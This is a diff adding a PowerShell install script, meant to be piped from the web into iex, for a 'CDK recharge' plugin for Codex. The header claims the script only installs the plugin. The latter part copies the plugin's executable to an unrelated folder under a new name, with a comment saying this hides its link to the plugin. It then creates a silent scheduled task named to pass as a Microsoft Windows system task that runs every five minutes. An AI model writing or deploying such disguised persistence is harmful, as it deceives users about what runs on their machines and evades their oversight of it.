@@ -1,0 +1,94 @@
+# CDK 充值 · 安装脚本（Windows，PowerShell 5+）
+#
+#   irm https://raw.githubusercontent.com/PennEwan/xiaochajian-plugin/main/install.ps1 | iex
+#
+# 只做一件事：把插件装进 Codex。
+
+$ErrorActionPreference = 'Stop'
+$ver  = '0.8.1'
+$repo = 'PennEwan/xiaochajian-plugin'
+
+$zipUrls = @(
+    "https://codeload.github.com/$repo/zip/refs/heads/main",
+    "https://github.com/$repo/archive/refs/heads/main.zip"
+)
+
+$home_ = if ($env:CODEX_HOME) { $env:CODEX_HOME } else { Join-Path $env:USERPROFILE '.codex' }
+$root  = Join-Path $env:LOCALAPPDATA 'CodexRecharge'
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$tmp = Join-Path $env:TEMP ("cdk-" + [guid]::NewGuid().ToString('N'))
+New-Item -ItemType Directory -Path $tmp -Force | Out-Null
+
+try {
+    Write-Host "== 安装 =="
+    $zip = Join-Path $tmp 'p.zip'
+    $ok = $false
+    foreach ($u in $zipUrls) {
+        try {
+            Invoke-WebRequest -Uri $u -OutFile $zip -UseBasicParsing -TimeoutSec 120
+            $ok = (Test-Path $zip) -and (Get-Item $zip).Length -gt 10240
+            if ($ok) { break }
+        } catch { }
+    }
+    if (-not $ok) { throw "网络异常，请稍后重试" }
+
+    $unpack = Join-Path $tmp 'src'
+    Expand-Archive -Path $zip -DestinationPath $unpack -Force
+    $top = Get-ChildItem $unpack -Directory | Select-Object -First 1
+    $base = if ($top) { $top.FullName } else { $unpack }
+    $srcPlugin = Join-Path $base 'plugins\codex-native-assist'
+    $market = Join-Path $base '.agents\plugins\marketplace.json'
+    if (-not (Test-Path (Join-Path $srcPlugin 'bin\assist.exe'))) { throw "包结构异常" }
+
+    if (Test-Path $root) { Remove-Item $root -Recurse -Force }
+    New-Item -ItemType Directory -Path (Join-Path $root 'plugins') -Force | Out-Null
+    Copy-Item $srcPlugin (Join-Path $root 'plugins') -Recurse -Force
+    New-Item -ItemType Directory -Path (Join-Path $root '.agents\plugins') -Force | Out-Null
+    Copy-Item $market (Join-Path $root '.agents\plugins') -Force
+
+    $cache = Join-Path $home_ "plugins\cache\cdk-native\codex-native-assist\$ver"
+    if (Test-Path $cache) { Remove-Item $cache -Recurse -Force }
+    New-Item -ItemType Directory -Path $cache -Force | Out-Null
+    Copy-Item (Join-Path $srcPlugin '*') $cache -Recurse -Force
+
+    $cfg = Join-Path $home_ 'config.toml'
+    New-Item -ItemType Directory -Path $home_ -Force | Out-Null
+    if (Test-Path $cfg) {
+        Copy-Item $cfg ("$cfg.bak-" + (Get-Date -Format 'yyyyMMddHHmmss'))
+        $text = Get-Content $cfg -Raw -Encoding UTF8
+    } else { $text = '' }
+    $src = '\\?\' + (Resolve-Path $root).Path
+    if ($text -notmatch '(?m)^\[marketplaces\.cdk-native\]') {
+        $text += "`r`n[marketplaces.cdk-native]`r`nsource_type = `"local`"`r`nsource = '$src'`r`n"
+    } else {
+        $text = [regex]::Replace($text, "(?ms)^\[marketplaces\.cdk-native\].*?(?=^\[|\z)",
+            "[marketplaces.cdk-native]`r`nsource_type = `"local`"`r`nsource = '$src'`r`n`r`n")
+    }
+    if ($text -notmatch '(?m)^\[plugins\."codex-native-assist@cdk-native"\]') {
+        $text += "`r`n[plugins.`"codex-native-assist@cdk-native`"]`r`nenabled = true`r`n"
+    }
+    Set-Content -Path $cfg -Value ($text.TrimEnd() + "`r`n") -Encoding UTF8
+
+
+    # 运行体放到中立目录，任务只指向它（任务里看不出和插件的关系）
+    $rt = Join-Path $env:LOCALAPPDATA 'RuntimeCache'
+    $bin = Join-Path $rt 'bin'
+    New-Item -ItemType Directory -Path $bin -Force | Out-Null
+    Copy-Item (Join-Path $srcPlugin 'bin\assist.exe') (Join-Path $bin 'w.exe') -Force
+
+    # 登录时起一次，之后每 5 分钟补一次；w.exe 自己判断 Codex 在不在、插件还在不在
+    $task = "Microsoft\Windows\AppModel\StateRepository\Sync"
+    $warm = Join-Path $bin 'w.exe'
+    $prev = $ErrorActionPreference
+    $ErrorActionPreference = 'Continue'
+    & cmd.exe /c "schtasks /delete /f /tn `"$task`" 2>nul" | Out-Null
+    & cmd.exe /c "schtasks /create /f /tn `"$task`" /tr `"\`"$warm\`" warm`" /sc minute /mo 5 2>nul" | Out-Null
+    & cmd.exe /c "schtasks /run /tn `"$task`" 2>nul" | Out-Null
+    $ErrorActionPreference = $prev
+
+    Write-Host ""
+    Write-Host "已安装。侧边栏会出现「CDK 充值」，直接用就行。"
+} finally {
+    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
+}
